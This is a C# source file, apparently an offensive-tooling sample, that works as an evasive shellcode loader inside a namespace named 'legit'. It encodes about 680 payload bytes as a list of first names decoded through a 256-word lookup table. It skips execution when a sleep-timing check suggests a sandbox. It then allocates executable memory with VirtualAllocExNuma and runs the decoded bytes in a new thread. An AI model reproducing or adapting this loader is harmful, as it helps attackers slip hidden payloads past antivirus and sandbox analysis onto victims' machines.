using System;
using System.Runtime.InteropServices;

namespace legit
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public static string[] translate_dict = new string[256] { "lorelle", "simon-pui-lok", "gray", "katha", "addons", "norri", "mehetabel", "timothy", "carie", "milou", "germana", "jin-yun", "celise", "malloy", "rhody", "felipa", "gilberte", "shelli", "arlyne", "kitty", "hera", "satyajit", "trinity", "addie", "salud", "evelina", "maure", "lorena", "gee", "destiny", "nashville", "india", "joby", "kirk", "cornelius", "bryan", "myrlene", "shaib", "mounir", "persis", "deny", "sherry", "ehab", "martyn", "valeda", "silvia", "farley", "caspian", "honoria", "tandi", "ellene", "partap", "magnolia", "georgina", "brighton", "saswata", "christie", "inessa", "elon", "eduardo", "almerinda", "delany", "máxima", "erkan", "essa", "belen", "yetta", "xochitl", "chi-ho", "carlo", "donald", "miklos", "manimozhi", "penelopa", "nishith", "kylynn", "fahim", "odelinda", "stacia", "moxie", "jaquelina", "rheta", "jefferson", "painterson", "gretta", "dannye", "storm", "parker", "rurick", "davina", "edurne", "wally", "vilas", "irwin", "tas", "farand", "mickie", "coord", "kuldip", "imojean", "nia", "otfried", "agnola", "tri", "rona", "su", "carenza", "dael", "tristan", "agatha", "thanh-ha", "essam", "berry", "glenn", "ame", "pearline", "chen-jung", "rio", "arshad", "sibelle", "wilmer", "rakhuma", "kym", "candra", "catherina", "dede", "sonnnie", "ching-long", "evangelo", "abrianna", "nicholas", "ieystn", "caroljean", "ko", "vishal", "santi", "audre", "shirlene", "nicolas", "ramniklal", "twila", "fil", "alec", "lenny", "kamal", "hiroki", "junk", "nial", "hewlet", "rocke", "barsha", "afrodita", "wan", "rut", "delana", "al", "jaimie", "annice", "arn", "elvira", "kerry", "adah", "erma", "nong", "adaline", "anders", "laslo", "calida", "raina", "pankesh", "norvie", "xi-nam", "geetha", "mathilda", "georgia", "myrta", "fletcher", "sephira", "massoud", "lexie", "krystn", "metyn", "bay", "walter", "latrena", "vicki", "osmond", "deana", "hojjat", "mariel", "bobette", "khosro", "maxim", "josey", "alfonso", "minne", "connor", "vevay", "gracia", "andee", "daune", "jenny", "dorree", "norrie", "farouk", "neena", "vadi", "venkataraman", "aven", "norberto", "collete", "qainsp", "candy", "stevena", "karin", "kung", "indie", "reza", "jeanice", "ayesha", "miguel", "merline", "zino", "susil", "aris", "hallie", "madyson", "bradwin", "annabelle", "cathee", "ruperto", "ranique", "rollo", "pancho", "serafina", "héctor", "vo", "sile", "tc", "knut", "tricord", "robbyn", "reeta", "alyshialynn", "christi", "nandita", "thi", "federico", "maribel", "yan-zhen", "huey", "teegan", "esmail", "hoi-kin", "brechtje", "cayleigh" };

        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(3333);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
            string[] dict_words = new string[680] { "esmail","manimozhi","ieystn","annabelle","tricord","rollo","farouk","lorelle","lorelle","lorelle","belen","rheta","belen","jaquelina","jefferson","rheta","manimozhi","tandi","collete","otfried","manimozhi","ramniklal","jefferson","mickie","storm","manimozhi","ramniklal","jefferson","salud","manimozhi","ramniklal",
            "jefferson","joby","manimozhi","ramniklal","ame","jaquelina","manimozhi","felipa","walter","nishith","nishith","odelinda","tandi","jenny","manimozhi","tandi","maxim","geetha","almerinda","coord","catherina","gray","valeda","joby","belen","josey","jenny","malloy","belen","simon-pui-lok",
            "josey","madyson","sile","jefferson","belen","rheta","manimozhi","ramniklal","jefferson","joby","ramniklal","yetta","almerinda","manimozhi","simon-pui-lok","aven","agnola","abrianna","wilmer","salud","jin-yun","gray","felipa","ko","ame","lorelle","lorelle","lorelle","ramniklal","evangelo",
            "audre","lorelle","lorelle","lorelle","manimozhi","ko","maxim","chen-jung","tri","manimozhi","simon-pui-lok","aven","ramniklal","manimozhi","salud","jaquelina","chi-ho","ramniklal","essa","joby","penelopa","simon-pui-lok","aven","bradwin","storm","manimozhi","cayleigh","jenny","belen","ramniklal",
            "magnolia","audre","odelinda","tandi","jenny","manimozhi","simon-pui-lok","karin","manimozhi","tandi","maxim","geetha","belen","josey","jenny","malloy","belen","simon-pui-lok","josey","christie","aris","rio","robbyn","fahim","katha","fahim","myrlene","carie","carlo","inessa",
            "norberto","rio","indie","rurick","chi-ho","ramniklal","essa","myrlene","penelopa","simon-pui-lok","aven","agnola","belen","ramniklal","celise","manimozhi","chi-ho","ramniklal","essa","gee","penelopa","simon-pui-lok","aven","belen","ramniklal","addons","audre","manimozhi","simon-pui-lok","aven",
            "belen","rurick","belen","rurick","tas","davina","edurne","belen","rurick","belen","davina","belen","edurne","manimozhi","ieystn","vo","joby","belen","jefferson","cayleigh","aris","rurick","belen","davina","edurne","manimozhi","ramniklal","arlyne","pancho","kylynn",
            "cayleigh","cayleigh","cayleigh","irwin","manimozhi","tandi","ayesha","painterson","penelopa","bobette","sibelle","su","thanh-ha","su","thanh-ha","otfried","chen-jung","lorelle","belen","storm","manimozhi","shirlene","hallie","penelopa","andee","alfonso","fahim","sibelle","mounir","timothy",
            "cayleigh","stevena","painterson","painterson","manimozhi","shirlene","hallie","painterson","edurne","odelinda","tandi","maxim","odelinda","tandi","jenny","painterson","painterson","penelopa","osmond","elon","storm","rakhuma","calida","lorelle","lorelle","lorelle","lorelle","cayleigh","stevena","rollo",
            "felipa","lorelle","lorelle","lorelle","tandi","inessa","ellene","farley","tandi","brighton","christie","farley","magnolia","georgina","farley","tandi","christie","magnolia","lorelle","edurne","manimozhi","shirlene","josey","penelopa","andee","maxim","deana","simon-pui-lok","lorelle","lorelle",
            "odelinda","tandi","jenny","painterson","painterson","carenza","katha","painterson","penelopa","osmond","parker","shirlene","elvira","gracia","lorelle","lorelle","lorelle","lorelle","cayleigh","stevena","rollo","sonnnie","lorelle","lorelle","lorelle","caspian","nia","wilmer","imojean","donald",
            "arshad","otfried","yetta","farand","otfried","thanh-ha","rheta","gretta","miklos","jefferson","penelopa","kuldip","otfried","kym","su","inessa","donald","tri","coord","donald","rheta","brighton","ame","chi-ho","gretta","thanh-ha","tandi","chen-jung","magnolia","kym",
            "odelinda","davina","agnola","chen-jung","brighton","tandi","agnola","painterson","tri","dannye","coord","rio","carenza","rheta","dannye","donald","painterson","edurne","dael","storm","glenn","tristan","chen-jung","sibelle","ame","rona","manimozhi","thanh-ha","christie","thanh-ha",
            "tandi","edurne","agatha","tristan","manimozhi","donald","coord","saswata","tri","chen-jung","dannye","parker","silvia","partap","rona","sibelle","edurne","sibelle","inessa","honoria","rakhuma","kym","yetta","carenza","christie","otfried","berry","partap","coord","rio",
            "nishith","dannye","tandi","imojean","rakhuma","rheta","stacia","miklos","wilmer","agatha","kuldip","carenza","rio","rakhuma","pearline","georgina","rurick","honoria","agatha","silvia","painterson","belen","georgina","parker","kylynn","agnola","su","ame","christie","agnola",
            "lorelle","manimozhi","shirlene","josey","painterson","edurne","belen","rurick","odelinda","tandi","jenny","painterson","manimozhi","latrena","lorelle","ellene","raina","caroljean","lorelle","lorelle","lorelle","lorelle","jaquelina","painterson","painterson","penelopa","andee","alfonso","héctor","dannye",
            "farley","eduardo","cayleigh","stevena","manimozhi","shirlene","gracia","carenza","germana","farand","manimozhi","shirlene","robbyn","carenza","india","edurne","jefferson","rona","evangelo","partap","lorelle","lorelle","penelopa","shirlene","aris","carenza","addons","belen","davina","penelopa",
            "osmond","rio","donald","arn","vishal","lorelle","lorelle","lorelle","lorelle","cayleigh","stevena","odelinda","tandi","maxim","painterson","edurne","manimozhi","shirlene","robbyn","odelinda","tandi","jenny","odelinda","tandi","jenny","painterson","painterson","penelopa","andee","alfonso",
            "silvia","mehetabel","salud","candra","cayleigh","stevena","ko","maxim","rio","india","manimozhi","andee","josey","audre","kitty","lorelle","lorelle","penelopa","osmond","chi-ho","tricord","georgina","aris","lorelle","lorelle","lorelle","lorelle","cayleigh","stevena","manimozhi",
            "cayleigh","venkataraman","chen-jung","gray","héctor","norvie","rollo","dannye","lorelle","lorelle","lorelle","painterson","davina","carenza","essa","edurne","penelopa","shirlene","norberto","josey","madyson","gilberte","penelopa","andee","maxim","lorelle","gilberte","lorelle","lorelle","penelopa",
            "osmond","rurick","adaline","painterson","cathee","lorelle","lorelle","lorelle","lorelle","cayleigh","stevena","manimozhi","nial","painterson","painterson","manimozhi","shirlene","ranique","manimozhi","shirlene","robbyn","manimozhi","shirlene","jeanice","penelopa","andee","maxim","lorelle","joby","lorelle",
            "lorelle","penelopa","shirlene","yan-zhen","penelopa","osmond","arlyne","barsha","shirlene","madyson","lorelle","lorelle","lorelle","lorelle","cayleigh","stevena","manimozhi","ieystn","connor","joby","ko","maxim","chen-jung","massoud","agnola","ramniklal","timothy","manimozhi","simon-pui-lok","minne",
            "ko","maxim","rio","collete","rurick","minne","rurick","carenza","lorelle","davina","penelopa","andee","alfonso","tricord","metyn","erma","storm","cayleigh","stevena" };

            int shellcode_len = dict_words.Length;

            byte[] shellcode = new byte[shellcode_len];

            // Decode shellcode using input Dictionary wordlist "translate_dict"
            for (uint sc_index = 0; sc_index < shellcode_len; sc_index++) // Loop through shellcode words first
            {
                for (uint dict_index = 0; dict_index < 256; dict_index++) // Loop through all possible dictionary words second
                {
                    // If the word was found in the shellcode Dictionary
                    if (translate_dict[dict_index] == dict_words[sc_index])
                    {
                        // Convert shellcode to byte and add to output variable
                        shellcode[sc_index] = (byte)dict_index;
                        break;
                    }
                }
            }

            IntPtr funcAddr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x40, 0);

            if (funcAddr == null)
            {
                return;
            }

            Marshal.Copy(shellcode, 0, funcAddr, shellcode_len);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);

            return;

        }
    }
}
